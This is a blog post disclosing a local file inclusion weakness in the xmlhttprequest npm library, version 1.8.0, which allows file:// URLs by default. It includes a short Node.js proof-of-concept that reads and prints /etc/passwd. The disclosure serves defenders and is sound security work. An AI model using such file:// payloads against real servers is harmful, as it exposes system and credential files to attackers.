---
title: Disclosing a local file inclusion vulnerability in xmlhttprequest library
description: >-
  I found a Local File Inclusion (LFI) security vulnerability in xmlhttprequest library but it's still unfixed.
date: '2023-04-27'
pubDate: '2023-04-27'
categories: []
keywords: []
draft: false
tags: ["security", "vulnerability", "advisory", "cve", "xmlhttprequest", "local-file-inclusion", "lfi"]
slug: local-file-inclusion-in-xmlhttprequest-library
image: ~/assets/images/blog/photo-1516849677043-ef67c9557e16.jpg
---

## What is the `xmlhttprequest` npm package?

The open-source npm package `xmlhttprequest` is a library for Node.js server-side projects to use a browser-like HTTP client. Mostly intended for a convenient API purposes, it is technically a wrapper around Node.js's core modules of `http` and `https`.

## Publicly disclosing a vulnerability in `xmlhttprequest`

As shared in a prior public disclosure report for the `xmlhttprequest` library, I discovered several security issues with the library and have reached out to the maintainer in hopes to report the security issue and get it fixed. However, they deemed it as not a flaw in security design and did not consider it as a viable vulnerability.

I'm sharing my findings here to publicly disclose the vulnerability.

## Incorrect Default Permissions in xmlhttprequest@1.8.0 lead to Local File Inclusion

Observations:
- It was last published 7 years ago in 2015 with version 1.8.0
- It has 1,814,290 weekly downloads from npm

Source code and registry resources for the library:
 * [Project's GitHub source code](https://github.com/driverdan/node-XMLHttpRequest)
 * [Project's npm package](https://www.npmjs.com/package/xmlhttprequest)

### Background on the vulnerability

The library mentions support by default for local file access in its [known issues](https://github.com/driverdan/node-XMLHttpRequest#known-issues--missing-features)
README documentation.

Given a scenario that an attacker controls the URL to be fetched using this HTTP client library, and that no explicit sanitization is performed for the URL and its scheme, it may result in arbitrary file read access, due to insecure default permission. Arbitrary file read access is scoped to the global file system for the web application or server using this library to make HTTP requests.

Related: local file system access [code handling](https://github.com/driverdan/node-XMLHttpRequest/blob/master/lib/XMLHttpRequest.js#L302-L329) on xmlhttprequest library.

This vulnerability should probably be classified as a 
[CWE-276](https://cwe.mitre.org/data/definitions/276.html): Incorrect Default Permissions.

### Proof of Concept exploit

Install the latest known vulnerable version of xmlhttprequest:
1. Install `xmlhttprequest@1.8.0` which is the latest version of this package. We will use it for a client web application.

Create the following `client.js` file that makes use of the library to send a `GET` HTTP request:

```js
const { XMLHttpRequest } = require("xmlhttprequest")

const xhr = new XMLHttpRequest()
const url = 'file:///etc/passwd'

a();

function a() { 
    // access local server files:
    xhr.open("GET", url)
    xhr.onreadystatechange = function() {
        if (this.readyState == 4) {
            console.log(this.responseText)
        }
    }
}

xhr.send()
```

Run this code snippet as a local Node.js script.

Observe that the the program prints the contents of the `/etc/passwd` file from your local file system.
